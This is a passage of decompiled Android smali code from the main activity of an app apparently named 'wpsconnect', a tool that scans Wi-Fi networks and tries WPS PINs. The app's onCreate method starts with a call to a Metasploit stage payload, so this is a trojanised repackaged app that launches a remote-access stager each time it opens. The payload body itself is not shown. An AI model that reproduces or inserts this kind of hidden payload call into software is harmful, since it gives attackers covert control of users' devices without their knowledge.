    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const v2, 0x7f070047

    invoke-virtual {v1, v2}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Ljava/lang/CharSequence;)Landroid/support/v7/a/c$a;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const v2, 0x7f070055

    invoke-virtual {p0, v2}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->E:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x7f070054

    invoke-virtual {p0, v2}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, " "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->G:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const v2, 0x7f070049

    invoke-virtual {p0, v2}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(Ljava/lang/CharSequence;)Landroid/support/v7/a/c$a;

    const v1, 0x7f070044

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$5;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$5;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const v1, 0x7f070048

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$6;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$6;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->c(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->c()Landroid/support/v7/a/c;

    return-void
.end method

.method private v()V
    .locals 3

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f070050

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(I)Landroid/support/v7/a/c$a;

    move-result-object v0

    const v1, 0x7f070044

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$7;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$7;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    return-void
.end method

.method private w()V
    .locals 3

    new-instance v0, Landroid/support/v7/a/c$a;

    invoke-direct {v0, p0}, Landroid/support/v7/a/c$a;-><init>(Landroid/content/Context;)V

    const v1, 0x7f07004c

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->b(I)Landroid/support/v7/a/c$a;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/support/v7/a/c$a;->a(Z)Landroid/support/v7/a/c$a;

    move-result-object v0

    const v1, 0x7f07005e

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$9;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$9;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->a(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    move-result-object v0

    const/high16 v1, 0x1040000

    new-instance v2, Lcom/ngb/wpsconnect/MainActivity$8;

    invoke-direct {v2, p0}, Lcom/ngb/wpsconnect/MainActivity$8;-><init>(Lcom/ngb/wpsconnect/MainActivity;)V

    invoke-virtual {v0, v1, v2}, Landroid/support/v7/a/c$a;->b(ILandroid/content/DialogInterface$OnClickListener;)Landroid/support/v7/a/c$a;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c$a;->b()Landroid/support/v7/a/c;

    move-result-object v0

    invoke-virtual {v0}, Landroid/support/v7/a/c;->show()V

    return-void
.end method

.method private x()V
    .locals 2

    new-instance v0, Lcom/google/android/gms/ads/c$a;

    invoke-direct {v0}, Lcom/google/android/gms/ads/c$a;-><init>()V

    sget-object v1, Lcom/google/android/gms/ads/c;->a:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v0

    const-string v1, "73A142758B586E36148D8867CD16EB3C"

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v0

    const-string v1, "A123691FEE8C9923FE6E625C530D7BB6"

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v0

    const-string v1, "F90025084208E15E34122013267C1B50"

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/c$a;->b(Ljava/lang/String;)Lcom/google/android/gms/ads/c$a;

    move-result-object v0

    invoke-virtual {v0}, Lcom/google/android/gms/ads/c$a;->a()Lcom/google/android/gms/ads/c;

    move-result-object v1

    const v0, 0x7f0d0083

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Lcom/google/android/gms/ads/AdView;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/ads/AdView;->a(Lcom/google/android/gms/ads/c;)V

    return-void
.end method


# virtual methods
.method protected a(Ljava/util/List;)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Landroid/net/wifi/ScanResult;",
            ">;)V"
        }
    .end annotation

    const/4 v7, 0x0

    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->x:Z

    if-nez v0, :cond_0

    sput-boolean v7, Lcom/ngb/wpsconnect/MainActivity;->w:Z

    :cond_0
    if-nez p1, :cond_1

    :goto_0
    return-void

    :cond_1
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    if-nez v0, :cond_2

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    :goto_1
    new-instance v9, Ljava/util/ArrayList;

    invoke-direct {v9}, Ljava/util/ArrayList;-><init>()V

    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v1

    :goto_2
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/ScanResult;

    invoke-interface {v9, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_2

    :cond_2
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    invoke-virtual {v0}, Ljava/util/ArrayList;->clear()V

    goto :goto_1

    :cond_3
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->p:Landroid/widget/TextView;

    const v1, 0x7f070056

    invoke-virtual {v0, v1}, Landroid/widget/TextView;->setText(I)V

    iget-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->p:Landroid/widget/TextView;

    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-eqz v0, :cond_4

    move v0, v7

    :goto_3
    invoke-virtual {v1, v0}, Landroid/widget/TextView;->setVisibility(I)V

    :goto_4
    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_6

    const/16 v1, -0x3e8

    const/4 v0, -0x1

    move v8, v0

    move v2, v1

    move v1, v7

    :goto_5
    invoke-interface {v9}, Ljava/util/List;->size()I

    move-result v0

    if-ge v1, v0, :cond_5

    invoke-interface {v9, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/wifi/ScanResult;

    iget v3, v0, Landroid/net/wifi/ScanResult;->level:I

    if-ge v2, v3, :cond_7

    move v2, v1

    :goto_6
    add-int/lit8 v0, v1, 0x1

    int-to-short v0, v0

    move v1, v0

    move v8, v2

    move v2, v3

    goto :goto_5

    :cond_4
    const/16 v0, 0x8

    goto :goto_3

    :cond_5
    iget-object v10, p0, Lcom/ngb/wpsconnect/MainActivity;->q:Ljava/util/ArrayList;

    new-instance v0, Lcom/ngb/wpsconnect/b;

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/net/wifi/ScanResult;

    iget-object v1, v1, Landroid/net/wifi/ScanResult;->BSSID:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/net/wifi/ScanResult;

    iget-object v2, v2, Landroid/net/wifi/ScanResult;->SSID:Ljava/lang/String;

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/wifi/ScanResult;

    iget-object v3, v3, Landroid/net/wifi/ScanResult;->capabilities:Ljava/lang/String;

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/net/wifi/ScanResult;

    iget v4, v4, Landroid/net/wifi/ScanResult;->level:I

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/net/wifi/ScanResult;

    iget v5, v5, Landroid/net/wifi/ScanResult;->level:I

    invoke-direct {p0, v5}, Lcom/ngb/wpsconnect/MainActivity;->b(I)I

    move-result v5

    invoke-interface {v9, v8}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/net/wifi/ScanResult;

    iget-object v6, v6, Landroid/net/wifi/ScanResult;->capabilities:Ljava/lang/String;

    invoke-direct {p0, v6}, Lcom/ngb/wpsconnect/MainActivity;->a(Ljava/lang/String;)I

    move-result v6

    invoke-direct/range {v0 .. v6}, Lcom/ngb/wpsconnect/b;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;II)V

    invoke-virtual {v10, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    invoke-interface {v9, v8}, Ljava/util/List;->remove(I)Ljava/lang/Object;

    goto :goto_4

    :cond_6
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->r:Landroid/widget/ArrayAdapter;

    invoke-virtual {v0}, Landroid/widget/ArrayAdapter;->notifyDataSetChanged()V

    goto/16 :goto_0

    :cond_7
    move v3, v2

    move v2, v8

    goto :goto_6
.end method

.method protected k()V
    .locals 3

    const/4 v2, 0x1

    const/4 v1, 0x0

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    if-nez v0, :cond_0

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->r()V

    :cond_0
    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager;->isWifiEnabled()Z

    move-result v0

    if-nez v0, :cond_1

    const v0, 0x7f07004f

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0, v2}, Landroid/net/wifi/WifiManager;->setWifiEnabled(Z)Z

    :cond_1
    sput-boolean v2, Lcom/ngb/wpsconnect/MainActivity;->w:Z

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager;->startScan()Z

    const v0, 0x7f070062

    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    return-void
.end method

.method protected l()V
    .locals 4

    const/4 v3, 0x0

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-ge v0, v1, :cond_1

    invoke-static {}, La/a/a/b$b;->a()Z

    move-result v0

    if-eqz v0, :cond_0

    new-instance v0, Lcom/ngb/wpsconnect/MainActivity$a;

    iget-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->H:Ljava/lang/String;

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    invoke-direct {v0, p0, v1, v2}, Lcom/ngb/wpsconnect/MainActivity$a;-><init>(Lcom/ngb/wpsconnect/MainActivity;Ljava/lang/String;Ljava/lang/String;)V

    new-array v1, v3, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/ngb/wpsconnect/MainActivity$a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :goto_0
    return-void

    :cond_0
    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->t()V

    goto :goto_0

    :cond_1
    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->A:Z

    if-eqz v0, :cond_3

    invoke-static {}, La/a/a/b$b;->a()Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Lcom/ngb/wpsconnect/MainActivity$a;

    iget-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->H:Ljava/lang/String;

    iget-object v2, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    invoke-direct {v0, p0, v1, v2}, Lcom/ngb/wpsconnect/MainActivity$a;-><init>(Lcom/ngb/wpsconnect/MainActivity;Ljava/lang/String;Ljava/lang/String;)V

    new-array v1, v3, [Ljava/lang/Void;

    invoke-virtual {v0, v1}, Lcom/ngb/wpsconnect/MainActivity$a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto :goto_0

    :cond_2
    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->t()V

    goto :goto_0

    :cond_3
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->F:Ljava/lang/String;

    iget-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->I:Ljava/lang/String;

    invoke-direct {p0, v0, v1}, Lcom/ngb/wpsconnect/MainActivity;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method protected m()Z
    .locals 7

    const/4 v2, 0x0

    const/4 v3, 0x1

    invoke-static {}, Lcom/ngb/wpsconnect/a;->a()Ljava/util/List;

    move-result-object v0

    const v1, 0x7f07005d

    invoke-virtual {p0, v1}, Lcom/ngb/wpsconnect/MainActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/ngb/wpsconnect/MainActivity;->G:Ljava/lang/String;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    move v1, v2

    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    if-nez v1, :cond_0

    invoke-virtual {v0, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v5

    iget-object v6, p0, Lcom/ngb/wpsconnect/MainActivity;->E:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_0

    move v0, v3

    :goto_1
    move v1, v0

    goto :goto_0

    :cond_0
    if-eqz v1, :cond_1

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    const-string v6, "s"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_1

    move v0, v2

    goto :goto_1

    :cond_1
    if-eqz v1, :cond_3

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    const-string v6, "p"

    invoke-virtual {v5, v6}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_3

    invoke-virtual {v0, v3}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->G:Ljava/lang/String;

    :goto_2
    return v3

    :cond_2
    move v3, v2

    goto :goto_2

    :cond_3
    move v0, v1

    goto :goto_1
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 v3, 0x0

    invoke-super {p0, p1}, Landroid/support/v7/a/d;->onCreate(Landroid/os/Bundle;)V

    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->C:Z

    if-eqz v0, :cond_0

    sput-boolean v3, Lcom/ngb/wpsconnect/MainActivity;->C:Z

    const v0, 0x7f04001c

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->setContentView(I)V

    :cond_0
    invoke-virtual {p0, v3}, Lcom/ngb/wpsconnect/MainActivity;->getPreferences(I)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "firstAppBoot"

    const/4 v2, 0x1

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->D:Z

    iget-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->D:Z

    if-eqz v0, :cond_1

    invoke-virtual {p0, v3}, Lcom/ngb/wpsconnect/MainActivity;->getPreferences(I)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v1, "useRoot"

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    :cond_1
    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->o()V

    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2

    invoke-static {}, La/a/a/b$b;->a()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f0e0000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    :goto_0
    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->g()Landroid/support/v7/a/a;

    move-result-object v0

    if-eqz v0, :cond_0

    const/16 v1, 0xa

    invoke-virtual {v0, v1}, Landroid/support/v7/a/a;->a(I)V

    :cond_0
    const/4 v0, 0x1

    return v0

    :cond_1
    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const v1, 0x7f0e0001

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    goto :goto_0
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 3

    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    const v1, 0x7f0d00ac

    if-ne v0, v1, :cond_1

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->s()V

    :cond_0
    :goto_0
    invoke-super {p0, p1}, Landroid/support/v7/a/d;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    return v0

    :cond_1
    const v1, 0x7f0d00aa

    if-ne v0, v1, :cond_4

    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->x:Z

    if-nez v0, :cond_0

    iget-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->z:Z

    if-nez v0, :cond_2

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->z:Z

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->q()V

    :cond_2
    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->B:Z

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-static {v0}, Lcom/ngb/wpsconnect/MainActivity;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->w()V

    goto :goto_0

    :cond_3
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    const-string v1, "List_Position"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->k()V

    goto :goto_0

    :cond_4
    const v1, 0x7f0d00ab

    if-ne v0, v1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ngb/wpsconnect/PasswordActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method

.method protected onPause()V
    .locals 2

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    invoke-virtual {p0, v0}, Lcom/ngb/wpsconnect/MainActivity;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_0
    const-string v0, "APP"

    const-string v1, "onPause"

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-super {p0}, Landroid/support/v7/a/d;->onPause()V

    return-void
.end method

.method public onPrepareOptionsMenu(Landroid/view/Menu;)Z
    .locals 1

    invoke-super {p0, p1}, Landroid/support/v7/a/d;->onPrepareOptionsMenu(Landroid/view/Menu;)Z

    move-result v0

    return v0
.end method

.method public onRequestPermissionsResult(I[Ljava/lang/String;[I)V
    .locals 3

    const/4 v2, 0x0

    packed-switch p1, :pswitch_data_0

    :goto_0
    return-void

    :pswitch_0
    array-length v0, p3

    if-lez v0, :cond_2

    aget v0, p3, v2

    if-nez v0, :cond_2

    iget-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->z:Z

    if-nez v0, :cond_0

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->z:Z

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->q()V

    :cond_0
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-static {v0}, Lcom/ngb/wpsconnect/MainActivity;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-lt v0, v1, :cond_1

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->w()V

    goto :goto_0

    :cond_1
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    const-string v1, "List_Position"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->k()V

    goto :goto_0

    :cond_2
    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->p()V

    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x64
        :pswitch_0
    .end packed-switch
.end method

.method protected onResume()V
    .locals 4

    const/4 v3, 0x0

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    if-nez v0, :cond_0

    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "List_Position"

    invoke-virtual {v0, v1, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v0

    iput-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->t:Landroid/content/Intent;

    :cond_0
    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->n:Lcom/ngb/wpsconnect/MainActivity$b;

    new-instance v1, Landroid/content/IntentFilter;

    const-string v2, "android.net.wifi.SCAN_RESULTS"

    invoke-direct {v1, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0, v1}, Lcom/ngb/wpsconnect/MainActivity;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    :cond_1
    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->x:Z

    if-eqz v0, :cond_2

    sget-object v0, Lcom/ngb/wpsconnect/MainActivity;->m:Landroid/net/wifi/WifiManager;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager;->startScan()Z

    :cond_2
    sget-boolean v0, Lcom/ngb/wpsconnect/MainActivity;->y:Z

    if-eqz v0, :cond_3

    iget-object v0, p0, Lcom/ngb/wpsconnect/MainActivity;->s:Landroid/content/Context;

    invoke-static {v0}, Lcom/ngb/wpsconnect/MainActivity;->a(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_4

    invoke-direct {p0}, Lcom/ngb/wpsconnect/MainActivity;->w()V

    :cond_3
    :goto_0
    invoke-super {p0}, Landroid/support/v7/a/d;->onResume()V

    return-void

    :cond_4
    sput-boolean v3, Lcom/ngb/wpsconnect/MainActivity;->y:Z

    invoke-virtual {p0}, Lcom/ngb/wpsconnect/MainActivity;->k()V

    goto :goto_0
.end method

.method protected onStop()V
    .locals 3

    const/4 v2, 0x0

    invoke-super {p0}, Landroid/support/v7/a/d;->onStop()V

    iget-boolean v0, p0, Lcom/ngb/wpsconnect/MainActivity;->D:Z

    if-eqz v0, :cond_0

